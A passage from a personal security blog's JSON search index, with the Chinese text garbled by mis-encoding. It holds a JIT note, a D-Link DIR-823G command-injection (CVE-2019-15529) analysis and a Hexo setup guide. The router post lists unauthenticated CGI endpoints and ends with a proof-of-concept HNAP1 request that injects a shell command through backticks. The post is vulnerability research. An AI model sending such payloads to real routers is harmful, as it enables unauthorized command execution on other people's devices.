printf(\"%d\\n\", p_inc(7)); return 0;} mmapç”³è¯·äº†ä¸€å—æœ‰å†™æƒé™å’Œæ‰§è¡Œæƒé™çš„å†…å­˜ï¼Œç„¶åå°†æ‰‹å†™çš„æœºå™¨ç è€ƒè¿›å»ï¼Œä½¿ç”¨ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘è¿™å—å†…å­˜å¹¶è°ƒç”¨å®ƒï¼Œé€šè¿‡è¿™ç§æ–¹å¼å°±å¯ä»¥æ‰§è¡Œè¿™ä¸€æ®µæ‰‹å†™çš„æœºå™¨ç äº†ã€‚ æˆ‘ä»¬é€šè¿‡æ‰‹å†™æœºå™¨ç å°†åŸæ¥çš„incå‡½æ•°ä»£æ›¿æ‰äº†ï¼Œåœ¨æ–°çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¨‹åºä¸­å®šä¹‰çš„æ•°æ®æ¥é‡æ–°é€ äº†ä¸€ä¸ªincå‡½æ•°ï¼Œè¿™ç§åœ¨è¿è¡Œè¿‡ç¨‹åˆ›å»ºæ–°çš„å‡½æ•°çš„æ–¹å¼ï¼Œå°±æ˜¯JITçš„æ ¸å¿ƒæ“ä½œã€‚","categories":[],"tags":[{"name":"chromeçŸ¥è¯†ç‚¹","slug":"chromeçŸ¥è¯†ç‚¹","permalink":"https://sinky.top/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]},{"title":"Dlink DIR-823G æ¼æ´æŒ–æ˜è¿‡ç¨‹","slug":"Dlink-Dir-823Gè·¯ç”±å™¨æ¼æ´æŒ–æ˜è¿‡ç¨‹","date":"2022-08-09T03:17:04.104Z","updated":"2022-08-11T14:22:14.496Z","comments":true,"path":"2022/08/09/Dlink-Dir-823Gè·¯ç”±å™¨æ¼æ´æŒ–æ˜è¿‡ç¨‹/","link":"","permalink":"https://sinky.top/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/","excerpt":"","text":"å›ºä»¶ä¸‹è½½åœ°å€ï¼š https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA æå–ç ï¼š1ly1 0x01 æ¼æ´ä»‹ç»D-Link DIR-823Gå‘½ä»¤æ³¨å…¥æ¼æ´ï¼š CVEç¼–å·ï¼šCVE-2019-15529 D-Link DIR-823Gæ˜¯ä¸­å›½å°æ¹¾å‹è®¯ï¼ˆD-Linkï¼‰å…¬å¸çš„ä¸€æ¬¾æ— çº¿è·¯ç”±å™¨ã€‚ä½¿ç”¨1.0.2B05ç‰ˆæœ¬å›ºä»¶çš„D-Link DIR-823Gä¸­çš„HNAP1å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æºäºå¤–éƒ¨è¾“å…¥æ•°æ®æ„é€ å¯æ‰§è¡Œå‘½ä»¤è¿‡ç¨‹ä¸­ï¼Œç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªæ­£ç¡®è¿‡æ»¤å…¶ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œéæ³•å‘½ä»¤ã€‚ 0x02 åˆ†æ binwalk -Me å›ºä»¶.bin //è§£å¼€å›ºä»¶ æ˜¯ä¸€ä¸ªsquashfsæ–‡ä»¶ç³»ç»Ÿï¼Œæ ‡å‡†linuxç›®å½•ç»“æ„ã€‚ cat /etc/init.d/rcS //æŸ¥çœ‹è·¯ç”±å™¨å¼€å¯çš„æœåŠ¡ã€‚ å‘ç°ä¸€ä¸ªgoaheadè¿›ç¨‹ã€‚ GoAhead(åµŒå…¥å¼WebæœåŠ¡å™¨)ï¼ŒGoAheadè‡ªèº«å®ç°ä¸€ä¸ªwebæœåŠ¡å™¨æ‰€éœ€æä¾›çš„åŸºæœ¬åŠŸèƒ½ï¼Œæä¾›å¤šç§æ–¹æ³•ä¾›æ‰©å±•æœåŠ¡å™¨çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬aspè¿‡ç¨‹ã€goformsè¿‡ç¨‹ã€‚ç”¨æˆ·å®šåˆ¶å‹éå¸¸å¼ºï¼Œå¯é€šè¿‡goaeadçš„apiå®šä¹‰urlå¤„ç†å‡½æ•°å’Œå¯ä¾›aspæ–‡ä»¶ä¸­è°ƒç”¨çš„å‡½æ•°ã€‚websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); /goformçš„è¯·æ±‚äº¤ç»™websFormHandlerå‡½æ•°å¤„ç†websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); /cgi-binçš„è¯·æ±‚äº¤ç»™websCgiHandlerå‡½æ•°å¤„ç†ã€‚ æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶ç¯å¢ƒä½¿ç”¨å·¥å…·firmware-ayalysis-toolkitã€‚ æ­å»ºæ•™ç¨‹ï¼šhttps://zhuanlan.zhihu.com/p/110806057 è¿è¡Œèµ·æ¥ånmapæ‰«ç«¯å£ï¼Œå‘ç°å¼€äº†httpæœåŠ¡å’ŒdnsæœåŠ¡ã€‚ è®¿é—®http://192.168.0.1,å¯çœ‹åˆ°Dlinkç™»å½•é¡µé¢ã€‚è¦æ±‚ç”¨æˆ·åšä¸€äº›è®¾ç½®ï¼Œä¸éœ€è¦å¯†ç å³å¯ç™»å½•ã€‚ åœ¨å›ºä»¶è§£å‹çš„æ–‡ä»¶ä¸‹æ‰¾åˆ°åä¸º web_mtnçš„æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯webç›®å½•ã€‚å…¶ä¸­cgi-binç›®å½•ä¸‹å­˜æ”¾çš„cgiæ–‡ä»¶å¯ä»¥éæˆæƒè®¿é—®ï¼Œå¯èƒ½é€ æˆå½±å“ã€‚ æœªæˆæƒè®¿é—®/cgi-bin/ExportSettings.sh å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼Œé€ æˆä¿¡æ¯æ³„éœ²ã€‚ /cgi-bin/upload_settings.cgi å¯¼å…¥é…ç½®æ–‡ä»¶ï¼Œå¯å¯¼å…¥æ¶æ„ç¯¡æ”¹åçš„é…ç½®ã€‚ /cgi-bin/GetDownLoadSyslog.sh è·å–ç³»ç»Ÿéƒ¨åˆ†å¯åŠ¨ä¿¡æ¯/var/log/messages* /cgi-bin/upload_firmware.cgi ä¸Šä¼ æ›´æ–°å›ºä»¶ï¼Œå¯æ¶æ„ä¿®æ”¹å›ºä»¶ goahead è‡ªå®šä¹‰çš„è¯·æ±‚å¤„ç†å‡½æ•° å¤„ç†å‡½æ•°çš„å‚æ•°åˆ—è¡¨ï¼šint websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t path, char_t query)goFormsè¿‡ç¨‹:å®ƒä¸»è¦ç”¨æ¥å“åº”ç”¨æˆ·è¾“å…¥ä»¥æ›´æ–°ç³»ç»Ÿè®¾ç½®æˆ–è€…æ‰§è¡Œç‰¹å®šçš„åŠ¨ä½œã€‚åœ¨GoAheadä¸­ï¼ŒgoFormså®ç°ä¸ºä¸€ä¸ªURLå¤„ç†å™¨ï¼Œå®ƒä¼šè§£é‡Šä»¥â€/goformâ€å¼€å§‹çš„URLsã€‚ç´§è·Ÿç€â€goformâ€ä¹‹åçš„å­—ç¬¦ä¸²å®šä¹‰äº†è¡¨å•åå­—å’Œç”¨æˆ·è¯·æ±‚çš„ç»†èŠ‚. IDAæ‰“å¼€goaheadåˆ†æï¼š é€šè¿‡å­—ç¬¦ä¸²/cgi-binæˆ–/goformæ‰¾åˆ°å®šä¹‰urlçš„å‡½æ•°ä½ç½®ã€‚äº¤å‰å¼•ç”¨ï¼Œå‘ç°æ³¨å†Œå¤„ç†å‡½æ•°ä½ç½®ä¸º0x42424C. websUrlHandlerDefine çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º url, ç¬¬å››ä¸ªå‚æ•°åº”è¯¥å°±æ˜¯ç›¸åº” url çš„å¤„ç†å‡½æ•°ã€‚ æŠ“å–ç™»å½•æ•°æ®åŒ…ï¼Œå‘ç°å¾€/HNAP1å‘é€ã€‚ åˆ†æ/HNAP1ï¼ˆ0x42383Cï¼‰å¤„ç†å‡½æ•°é€»è¾‘: ä» wp ç»“æ„ä½“ä¸­å–å‡ºæ­¤æ¬¡è¯·æ±‚éœ€è¦è°ƒç”¨çš„å‡½æ•°åï¼Œç„¶åå»å…¨å±€å‡½æ•°è¡¨é‡Œé¢æœç´¢ï¼Œæ‰¾åˆ°ä¹‹ååœ¨è¿›è¡Œå¤„ç†ã€‚ æ‰¾åˆ°éœ€è¦è°ƒç”¨çš„å¤„ç†å‡½æ•°åï¼Œä¼šé¦–å…ˆè®°å½•POSTåŸå§‹æŠ¥æ–‡ã€‚è¿™é‡Œè®°å½•æ—¥å¿—é¦–å…ˆæ˜¯ç”¨snprintfç”Ÿæˆå‘½ä»¤ï¼Œç„¶åsystemæ‰§è¡Œã€‚ æ­¤å¤„å¯ä»¥ç›´æ¥æ³¨å…¥â€™æ¥å‘½ä»¤æ‰§è¡Œã€‚ åœ¨PHPä¸­å¸¸ç”¨åˆ°ä»¥ä¸‹å‡ ä¸ªå‡½æ•°æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤:system system()å‡½æ•°èƒ½å¤Ÿå°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œå¹¶è‡ªå¸¦è¾“å‡ºåˆ°å½“å‰é¡µé¢çš„åŠŸèƒ½ execpassthrushell_exec POC1234567891011POST /HNAP1/ HTTP/1.1Host: 192.168.0.1Content-Length: 53User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: text/xml; charset=UTF-8Accept: */*SOAPAction: \"http://purenetworks.com/HNAP1/Login\"Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"æ¼æ´ï¼Œè·¯ç”±å™¨æ¼æ´","slug":"æ¼æ´ï¼Œè·¯ç”±å™¨æ¼æ´","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]},{"title":"Win10ä¸‹ä½¿ç”¨Hexoæ­å»ºä¸ªäººåšå®¢","slug":"Win10ä¸‹ä½¿ç”¨Hexoæ­å»ºä¸ªäººåšå®¢","date":"2022-08-07T08:48:45.669Z","updated":"2022-08-11T14:19:01.663Z","comments":true,"path":"2022/08/07/Win10ä¸‹ä½¿ç”¨Hexoæ­å»ºä¸ªäººåšå®¢/","link":"","permalink":"https://sinky.top/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"ä¸‹è½½å®‰è£…gitã€nodejsä¸‹è½½åœ°å€: git: https://git-scm.com/ nodejs: http://nodejs.cn/download/ å°†nodejsåŠ å…¥pathç¯å¢ƒå˜é‡ä¸­ã€‚æ‰“å¼€cmdæµ‹è¯•ï¼š æŠ¥é”™1ï¼šè¾“å…¥ npm-v å‡ºç°æŠ¥é”™: npm WARN config global --global, --local are deprecated. Use `â€“location è§£å†³æ–¹æ³•ï¼šæ‰“å¼€nodejså®‰è£…ä½ç½®æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€npm.cmdå’Œnpmï¼Œå°†æ–‡ä»¶ä¸­çš„prefix -gæ›¿æ¢ä¸ºprefix --location=global,ä¿å­˜åé‡æ–°æ‰“å¼€cmdæµ‹è¯•å³å¯ã€‚ å®‰è£…hexoæ¢æºï¼ˆæ·˜å®æºï¼‰npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm -v æŸ¥çœ‹ç‰ˆæœ¬ä»¥åŠæ˜¯å¦å®‰è£…æˆåŠŸã€‚ å®‰è£…hexocnpm install -g hexo-cli hexo -v æ–°å»ºæ–‡ä»¶å¤¹æ”¾ç½®åšå®¢å†…å®¹ï¼Œåœ¨cmdä¸­è¿›å…¥æ‰€å»ºç«‹çš„ç›®å½•ï¼š hexo init #åˆå§‹åŒ–hexo hexo s #å¯åŠ¨hexo è®¿é—® http://localhost:4000/å¦‚ä¸‹å³æˆåŠŸï¼š æ–°å»ºæ–‡ç« hexo new \"æ–‡ç« æ ‡é¢˜\" åœ¨ç›®å½•/source/_posts/ä¸‹ç”Ÿæˆæ–‡ä»¶.mdæ›´æ–°æ–‡ç« ï¼š hexo clean hexo g hexo s éƒ¨ç½²github1ã€å»ºç«‹ä¸€ä¸ªæ–°çš„åº“ï¼Œå‘½åéœ€è¦ç¬¦åˆè§„åˆ™ï¼šusername.gitgub.io2ã€å‘½ä»¤è¡Œè¾“å…¥ï¼š cnpm install --save hexo-deployer-git 3ã€æ›´æ”¹è®¾ç½® æ‰¾åˆ°_config.ymlæ–‡ä»¶ï¼Œç¿»åˆ°æœ€åº•éƒ¨ å°†typeæ”¹ä¸ºgit æ·»åŠ repo: \"æ­¤å¤„ä¸ºä»“åº“åœ°å€\" æ·»åŠ branch: master repoä¸ºä»“åº“åœ°å€ branchä¸ºmasterå³å¯ 4ã€éƒ¨ç½²åˆ°è¿œç«¯ git config --global user.email \"xxx(æ­¤å¤„ä¸ºé‚®ç®±)\" git config --global user.name \"xxx(æ­¤å¤„ä¸ºç”¨æˆ·å)\" #githubç”¨æˆ·å hexo d å¼¹å‡ºç½‘é¡µæç¤ºæ˜¯å¦å…³è”gitå’Œgithub æˆæƒå³å¯","categories":[],"tags":[{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]}],"categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"},{"name":"è½¯ä»¶æµ‹è¯•ï¼Œé¢è¯•å‡†å¤‡","slug":"è½¯ä»¶æµ‹è¯•ï¼Œé¢è¯•å‡†å¤‡","permalink":"https://sinky.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"},{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"sql","slug":"sql","permalink":"https://sinky.top/tags/sql/"},{"name":"SSRF","slug":"SSRF","permalink":"https://sinky.top/tags/SSRF/"},{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"},{"name":"å¢¨è€…å­¦é™¢","slug":"å¢¨è€…å­¦é™¢","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"ä»»æ„æ–‡ä»¶è¯»å–","slug":"ä»»æ„æ–‡ä»¶è¯»å–","permalink":"https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"WebShell","slug":"WebShell","permalink":"https://sinky.top/tags/WebShell/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://sinky.top/tags/RCE/"},{"name":"Re","slug":"Re","permalink":"https://sinky.top/tags/Re/"},{"name":"Buu","slug":"Buu","permalink":"https://sinky.top/tags/Buu/"},{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"},{"name":"windowsæ¼æ´","slug":"windowsæ¼æ´","permalink":"https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"},{"name":"XSS","slug":"XSS","permalink":"https://sinky.top/tags/XSS/"},{"name":"chrome","slug":"chrome","permalink":"https://sinky.top/tags/chrome/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"chromeè°ƒè¯•","slug":"chromeè°ƒè¯•","permalink":"https://sinky.top/tags/chrome%E8%B0%83%E8%AF%95/"},{"name":"bp","slug":"bp","permalink":"https://sinky.top/tags/bp/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ¼æ´æˆ˜äº‰","slug":"æ¼æ´æˆ˜äº‰","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"å·¥å…·å­¦ä¹ ","slug":"å·¥å…·å­¦ä¹ ","permalink":"https://sinky.top/tags/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://sinky.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"chromeçŸ¥è¯†ç‚¹","slug":"chromeçŸ¥è¯†ç‚¹","permalink":"https://sinky.top/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"name":"æ¼æ´ï¼Œè·¯ç”±å™¨æ¼æ´","slug":"æ¼æ´ï¼Œè·¯ç”±å™¨æ¼æ´","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]}